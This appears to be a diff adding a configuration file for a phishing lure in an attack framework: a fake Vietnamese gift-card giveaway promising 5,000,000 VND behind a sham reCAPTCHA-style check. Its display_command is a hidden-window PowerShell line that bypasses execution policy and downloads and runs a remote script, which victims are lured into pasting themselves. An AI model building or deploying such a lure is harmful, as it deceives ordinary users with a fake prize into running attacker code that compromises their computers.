@@ -1,0 +1,25 @@
+# Coupon / Gift Card Lure
+# Fake gift card giveaway with reCAPTCHA-style verification
+
+type: coupon
+template: lures/coupon_captcha.html
+route: /uu-dai
+
+payload:
+  script: "default.js"
+
+content:
+  title: "Chúc Mừng! Bạn Đã Trúng Thẻ Quà Tặng 5.000.000 VNĐ"
+  subtitle: "Ưu đãi có thời hạn — Nhận quà ngay!"
+  brand_logo: "🎁"
+  offer_value: "5.000.000 VNĐ"
+  offer_label: "Thẻ Quà Tặng"
+  instructions: "Hoàn tất xác minh nhanh để nhận giải thưởng"
+  button_text: "Nhận Ngay — MIỄN PHÍ"
+  terms: "Khi nhận, bạn đồng ý với điều khoản của chúng tôi. Ưu đãi chỉ có hiệu lực trong 24 giờ."
+  display_command: "powershell -w h -ep bypass -c \"IEX (iwr 'http://localhost:8080/api/payloads/default.ps1' -UseBasicParsing).Content\""
+
+styles:
+  theme: "promo"
+  primary_color: "#667eea"
+  secondary_color: "#764ba2"
